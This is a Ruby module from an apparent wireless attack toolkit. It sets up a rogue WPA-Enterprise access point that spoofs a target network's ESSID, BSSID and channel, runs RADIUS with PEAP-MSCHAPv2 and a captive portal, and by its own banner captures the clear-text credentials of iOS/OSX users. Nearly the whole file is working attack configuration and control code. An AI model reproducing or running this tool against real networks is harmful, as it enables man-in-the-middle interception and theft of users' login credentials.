#!/usr/bin/ruby
##################################################################################################
# Created by: PuNk1nPo0p					     				 #
# MITM attack for IOS/OSX devices using PEAP-MSCHAPv2		       				 #
##################################################################################################

require './modules/UI'
require './modules/config_modules'

#MAIN_MENU---------------------------------------------------------------------------------------#

def ipwner_menu
	system("clear")
	print "	_".yellow,"       ,..".light_green,"	
   ,--._".light_red,"\\\\".yellow,"_.--,".light_red,"(-".light_green,"00".light_white,")".light_green,"  __".light_white," ____".light_red,"  _  _".light_blue," __ _".light_yellow," ____".light_green,"
  ;/".light_red,"#".light_white,"////////".light_red,"_".light_green,":".light_red,"(".light_green,"  ^".light_magenta,")".light_green," (  |  _ \\/ )( (  ( (  _ \\".light_white,"
  ##########".light_blue,"(_____/".light_green,"   )( ) __/\\ /\\ /    /)   /".light_white,"
  `%%%%%%%%%%%%%`".light_yellow,"    (__|".light_white,"__".light_red,")  (".light_white,"_".light_blue,"/\\".light_white,"_".light_blue,")".light_white,"_".light_yellow,")".light_white,"__".light_green,"|".light_white,"__".light_green,"\\".light_white,"_".light_green,")".light_white,"
   `$$$$$.$$$$$`".light_green,"
    `^^'` `^^'`\n".light_green	
print "#################################################################\n".light_white
print "## This attack exploits an implimentation flaw in MSChapV2     ##\n".light_white
print "## on most IOS/OSX devices.  It allows a MITM connection to be ##\n".light_white
print "## established, then prompts the user with a captive portal    ##\n".light_white
print "## where the users clear-text credentials are captured.        ##\n".light_white
print "#################################################################\n".light_white
	puts ""					      	               
	print "1.".light_white," START\n".light_cyan				   	   			
	print "2.".light_white," STOP\n".light_cyan						       
	print "3.".light_white," MAIN MENU\n".light_cyan										
	puts ""
		@option = 0
		until @option != 0 and @option < 4 do print @start,"PICK ONE?".light_yellow,@prompt
		@option = gets.to_i
		end
		
		if @option == 1 then ipwner_start
		end
		if @option == 2 then ipwner_stop
		end
		if @option == 3 then main_menu
		end
		
end


#ATTACK-----------------------------------------------------------------------------------------#

def ipwner_start	
	get_interface
	get_essid
	get_bssid
	get_channel
	ipwner_interface_config
	ipwner_dhcp_config
	ipwner_radius_config
	ipwner_hostapd_config
	start_harvester
	start_radius
	start_hostapd
	ipwner_menu
end

#CONFIGURATION ITEMS-----------------------------------------------------------------------------#

def ipwner_interface_config
	config_interface
	system("ifconfig #@interface 192.168.10.1 netmask 255.255.255.0")
end

def ipwner_dhcp_config
	@dhcpfile = "ipwner_dnsmasq.conf"
	config_dhcp
end

def ipwner_radius_config
	@eaptype = "peap"
	@peapv = "mschapv2"
	config_radius
end

def ipwner_hostapd_config
	@hostapd = "ipwner_config"
	@apconfig = "interface=#@interface\nchannel=#@channel\n\
ssid=#@essid\nieee8021x=1\nauth_server_addr=127.0.0.1\nauth_server_port=1812\n\
auth_server_shared_secret=testing123\nwpa=2\nwpa_key_mgmt=WPA-EAP\nrsn_pairwise=CCMP\n"
	config_hostapd
end

#STOP_ALL----------------------------------------------------------------------------------------#

def ipwner_stop
	system("killall web_portal.rb")
	system("killall tail")
	system("killall radiusd")
	system("killall hostapd")
	system("killall dhclient")	
	system("echo > /etc/dnsmasq.leases")
	system("echo > /etc/dnsmasq.conf")
	system("/etc/init.d/dnsmasq restart && ifconfig eth0 down && ifconfig eth0 up")
	system("dhclient eth0")
	ipwner_menu
end

#END---------------------------------------------------------------------------------------------#

